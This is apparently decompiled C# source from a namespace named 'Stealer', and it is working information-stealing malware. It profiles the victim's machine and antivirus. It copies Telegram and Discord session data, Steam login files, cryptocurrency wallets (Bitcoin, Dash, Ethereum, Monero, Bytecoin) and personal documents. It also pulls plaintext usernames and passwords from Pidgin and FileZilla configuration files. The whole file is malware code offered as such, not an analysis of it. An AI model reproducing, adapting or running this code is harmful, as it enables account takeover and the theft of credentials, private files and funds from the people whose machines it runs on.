using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Xml;
using file;
using Microsoft.Win32;

namespace Stealer
{
	// Token: 0x02000018 RID: 24
	internal class Files
	{
		// Token: 0x0600005E RID: 94 RVA: 0x00007E1C File Offset: 0x0000601C
		public static void Informationfile(string path)
		{
			try
			{
				string text = string.Concat(new string[]
				{
					"◨ ◩ ◪ ◧◨ ◩ ◪ ◧◨ ◩ ◪ ◧\r\nStartup path: ",
					Assembly.GetExecutingAssembly().Location.Replace("/", "\\"),
					"\r\nHWID: ",
					Helper.Hwid(),
					"\r\nUser name: ",
					Environment.UserName,
					"\r\nMachine name: ",
					Environment.MachineName,
					"\r\n"
				});
				try
				{
					string text2 = "";
					string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
					{
						bool flag = registryKey != null;
						if (flag)
						{
							try
							{
								string text3 = registryKey.GetValue("ProductName").ToString();
								bool flag2 = text3 == "";
								if (flag2)
								{
									text2 = "Error";
								}
								bool flag3 = text3.Contains("XP");
								if (flag3)
								{
									text2 = "XP";
								}
								else
								{
									bool flag4 = text3.Contains("7");
									if (flag4)
									{
										text2 = "Windows 7";
									}
									else
									{
										bool flag5 = text3.Contains("8");
										if (flag5)
										{
											text2 = "Windows 8";
										}
										else
										{
											bool flag6 = text3.Contains("10");
											if (flag6)
											{
												text2 = "Windows 10";
											}
											else
											{
												bool flag7 = text3.Contains("2012");
												if (flag7)
												{
													text2 = "Windows Server";
												}
												else
												{
													text2 = "Windows";
												}
											}
										}
									}
								}
							}
							catch
							{
								text2 = "Error";
							}
						}
						else
						{
							text2 = "Error";
						}
					}
					bool is64BitOperatingSystem = Environment.Is64BitOperatingSystem;
					if (is64BitOperatingSystem)
					{
						text2 += " x64";
					}
					else
					{
						text2 += " x32";
					}
					text = text + "Windows version: " + text2 + "\r\n";
				}
				catch
				{
				}
				try
				{
					using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string str = text;
							string str2 = "Antivirus name: ";
							object obj = managementBaseObject["displayName"];
							text = str + str2 + ((obj != null) ? obj.ToString() : null) + "\r\n";
						}
					}
				}
				catch
				{
				}
				try
				{
					using (ManagementObjectCollection managementObjectCollection2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
					{
						using (ManagementObjectCollection.ManagementObjectEnumerator enumerator2 = managementObjectCollection2.GetEnumerator())
						{
							if (enumerator2.MoveNext())
							{
								ManagementBaseObject managementBaseObject2 = enumerator2.Current;
								object obj2 = managementBaseObject2["Name"];
								string str3 = (obj2 != null) ? obj2.ToString() : null;
								text = text + "CPU name: " + str3 + "\r\n";
							}
						}
					}
				}
				catch
				{
				}
				try
				{
					using (ManagementObjectCollection managementObjectCollection3 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
					{
						foreach (ManagementBaseObject managementBaseObject3 in managementObjectCollection3)
						{
							string str4 = text;
							string str5 = "GPU name: ";
							object obj3 = managementBaseObject3["Caption"];
							text = str4 + str5 + ((obj3 != null) ? obj3.ToString() : null) + "\r\n";
						}
					}
				}
				catch
				{
				}
				text += "――――――――――――――――――――――――――――――――――――――――――――\r\n";
				try
				{
					text += string.Format("Number of running processes: {0}\r\n\r\n", Process.GetProcesses().Length);
					Array.Sort<Process>(Process.GetProcesses(), (Process p1, Process p2) => p1.ProcessName.CompareTo(p2.ProcessName));
					foreach (Process process in Process.GetProcesses())
					{
						bool flag8 = Process.GetCurrentProcess().Id == process.Id || process.Id == 0;
						if (!flag8)
						{
							text = text + process.ProcessName + "\r\n";
						}
					}
					text += "――――――――――――――――――――――――――――――――――――――――――――";
				}
				catch
				{
				}
				StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.Write(text);
				streamWriter.Close();
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000083BC File Offset: 0x000065BC
		public static void Telegram(string path)
		{
			string text = "";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			string str = null;
			bool flag = processesByName.Length < 1;
			if (flag)
			{
				bool flag2 = Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop");
				if (flag2)
				{
					try
					{
						Process.Start(new ProcessStartInfo
						{
							WindowStyle = ProcessWindowStyle.Minimized,
							FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\Telegram.exe"
						});
						Thread.Sleep(1500);
						Process[] processesByName2 = Process.GetProcessesByName("Telegram");
						text = Path.GetDirectoryName(processesByName2[0].MainModule.FileName) + "\\tdata";
					}
					catch
					{
					}
				}
			}
			else
			{
				text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
			}
			bool flag3 = Directory.Exists(text);
			if (flag3)
			{
				string[] array = Directory.GetFiles(text);
				string[] directories = Directory.GetDirectories(text);
				Directory.CreateDirectory(path + "\\tdata");
				foreach (string path2 in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path2);
						bool flag4 = Convert.ToInt64(directoryInfo.Name.Length) > 15L;
						if (flag4)
						{
							Directory.CreateDirectory(path + "\\tdata\\" + directoryInfo.Name);
							str = directoryInfo.Name;
						}
					}
					catch
					{
					}
				}
				foreach (string text2 in array)
				{
					try
					{
						FileInfo fileInfo = new FileInfo(text2);
						bool flag5 = Convert.ToInt64(fileInfo.Length) < 5000L && fileInfo.Name.Length > 15 && Path.GetExtension(text2) != ".json";
						if (flag5)
						{
							File.Copy(text2, path + "\\tdata\\" + fileInfo.Name);
						}
					}
					catch (Exception)
					{
					}
				}
				string[] array4 = new string[]
				{
					text + "\\" + str + "\\map0",
					text + "\\" + str + "\\map1"
				};
				try
				{
					bool flag6 = File.Exists(array4[0]);
					if (flag6)
					{
						File.Copy(array4[0], path + "\\tdata\\" + str + "\\map0");
					}
				}
				catch
				{
				}
				try
				{
					bool flag7 = File.Exists(array4[1]);
					if (flag7)
					{
						File.Copy(array4[1], path + "\\tdata\\" + str + "\\map1");
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000086A8 File Offset: 0x000068A8
		public static void TakeFiles(string path)
		{
			try
			{
				Directory.CreateDirectory(path);
				List<string> list = new List<string>();
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					list.Add(driveInfo.Name);
				}
				list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Desktop");
				list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Downloads");
				list.Add("C:\\Users\\" + Environment.UserName.ToString() + "\\Documents");
				foreach (string dir in list.ToArray())
				{
					Files.TakeFiles(dir, path);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00008794 File Offset: 0x00006994
		private static void TakeFiles(string dir, string path)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(dir).GetFiles())
				{
					bool flag = fileInfo.Extension.Equals(".doc") || fileInfo.Extension.Equals(".docx") || fileInfo.Extension.Equals(".txt") || fileInfo.Extension.Equals(".log") || fileInfo.Extension.Equals(".rdp");
					if (flag)
					{
						fileInfo.CopyTo(path + "\\" + fileInfo.Name);
						Files.files++;
					}
				}
				foreach (DirectoryInfo directoryInfo in new DirectoryInfo(dir).GetDirectories())
				{
					foreach (FileInfo fileInfo2 in new DirectoryInfo(dir + "\\" + directoryInfo.ToString()).GetFiles())
					{
						bool flag2 = fileInfo2.Extension.Equals(".doc") || fileInfo2.Extension.Equals(".docx") || fileInfo2.Extension.Equals(".txt") || fileInfo2.Extension.Equals(".log") || fileInfo2.Extension.Equals(".rdp");
						if (flag2)
						{
							fileInfo2.CopyTo(path + "\\" + fileInfo2.Name);
							Files.files++;
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00008978 File Offset: 0x00006B78
		public static void Crypto(string dir)
		{
			bool flag = false;
			Directory.CreateDirectory(dir);
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
				{
					bool flag2 = fileInfo.Extension.Equals(".wallet");
					if (flag2)
					{
						Directory.CreateDirectory(dir + "\\Bytecoin\\");
						fileInfo.CopyTo(dir + "\\Bytecoin\\" + fileInfo.Name);
						flag = true;
					}
				}
			}
			catch
			{
			}
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					bool flag3 = File.Exists(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat");
					if (flag3)
					{
						Directory.CreateDirectory(dir + "\\BitcoinCore\\");
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", dir + "\\BitcoinCore\\wallet.dat");
						flag = true;
					}
				}
			}
			catch
			{
			}
			try
			{
				using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
				{
					bool flag4 = File.Exists(registryKey2.GetValue("strDataDir").ToString() + "\\wallet.dat");
					if (flag4)
					{
						Directory.CreateDirectory(dir + "\\DashCore\\");
						File.Copy(registryKey2.GetValue("strDataDir").ToString() + "\\wallet.dat", dir + "\\DashCore\\wallet.dat");
						flag = true;
					}
				}
			}
			catch
			{
			}
			try
			{
				foreach (FileInfo fileInfo2 in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore").GetFiles())
				{
					Directory.CreateDirectory(dir + "\\Ethereum\\");
					fileInfo2.CopyTo(dir + "\\Ethereum\\" + fileInfo2.Name);
					flag = true;
				}
			}
			catch
			{
			}
			try
			{
				using (RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						string text = registryKey3.GetValue("wallet_path").ToString().Replace("/", "\\");
						char[] separator = new char[]
						{
							'\\'
						};
						char[] separator2 = new char[]
						{
							'\\'
						};
						bool flag5 = File.Exists(text);
						if (flag5)
						{
							Directory.CreateDirectory(dir + "\\Monero\\");
							File.Copy(text, dir + "\\Monero\\" + text.Split(separator)[text.Split(separator2).Length - 1]);
							flag = true;
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				bool flag6 = !flag;
				if (flag6)
				{
					Directory.Delete(dir);
				}
				else
				{
					Console.WriteLine("hello");
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00008D40 File Offset: 0x00006F40
		public static void Pidgin(string path)
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
			StringBuilder stringBuilder = new StringBuilder();
			bool flag = File.Exists(text);
			if (flag)
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(new XmlTextReader(text));
					foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
					{
						XmlNode xmlNode = (XmlNode)obj;
						string innerText = xmlNode.ChildNodes[0].InnerText;
						string innerText2 = xmlNode.ChildNodes[1].InnerText;
						string innerText3 = xmlNode.ChildNodes[2].InnerText;
						bool flag2 = !string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3);
						if (!flag2)
						{
							break;
						}
						stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
						stringBuilder.AppendLine("Protocol     | " + innerText);
						stringBuilder.AppendLine("Login        | " + innerText2);
						stringBuilder.AppendLine("Password     | " + innerText3);
					}
					bool flag3 = stringBuilder.Length > 0;
					if (flag3)
					{
						stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
						try
						{
							Directory.CreateDirectory(path + "\\");
							File.AppendAllText(path + "\\Pidgin.txt", stringBuilder.ToString());
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00008F24 File Offset: 0x00007124
		public static void Discord(string path)
		{
			try
			{
				bool flag = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage");
				if (flag)
				{
					Directory.CreateDirectory(path);
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", path + "\\https_discordapp.com_0.localstorage", true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00008F94 File Offset: 0x00007194
		public static void FileZilla(string path)
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml";
			StringBuilder stringBuilder = new StringBuilder();
			int num = 0;
			try
			{
				bool flag = File.Exists(text);
				if (flag)
				{
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
						{
							XmlElement xmlElement = (XmlElement)obj;
							string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
							string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
							string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
							string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
							bool flag2 = !string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3) && !string.IsNullOrEmpty(@string);
							if (!flag2)
							{
								break;
							}
							stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
							stringBuilder.AppendLine("Host         | " + innerText + ":" + innerText2);
							stringBuilder.AppendLine("User         | " + innerText3);
							stringBuilder.AppendLine("Password     | " + @string);
							num++;
						}
						bool flag3 = stringBuilder.Length > 0;
						if (flag3)
						{
							stringBuilder.AppendLine("――――――――――――――――――――――――――――――――――――――――――――");
							try
							{
								Directory.CreateDirectory(path + "\\");
								File.AppendAllText(path + "\\FileZilla.txt", stringBuilder.ToString());
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000091FC File Offset: 0x000073FC
		public static void Steam(string path)
		{
			try
			{
				string text = Path.Combine(path, "config");
				string path2 = Path.Combine(SteamHelper.GetLocationSteam("InstallPath", "SourceModInstallPath"), "config");
				bool flag = Directory.Exists(SteamHelper.GetLocationSteam("InstallPath", "SourceModInstallPath"));
				if (flag)
				{
					Directory.CreateDirectory(path);
					foreach (string text2 in Directory.GetFiles(SteamHelper.GetLocationSteam("InstallPath", "SourceModInstallPath"), "*."))
					{
						try
						{
							File.Copy(text2, Path.Combine(path, Path.GetFileName(text2)));
						}
						catch
						{
						}
					}
					bool flag2 = !Directory.Exists(text);
					if (flag2)
					{
						Directory.CreateDirectory(text);
						File.AppendAllText(path + "\\Accounts.txt", SteamHelper.GetSteamID());
						foreach (string text3 in Directory.GetFiles(path2, "*.vdf"))
						{
							try
							{
								File.Copy(text3, Path.Combine(text, Path.GetFileName(text3)));
							}
							catch
							{
							}
						}
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (IOException)
			{
			}
			catch (ArgumentException)
			{
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000093AC File Offset: 0x000075AC
		public static void GetFiles(string path)
		{
		}

		// Token: 0x0400000E RID: 14
		private static int files = 0;
	}
}
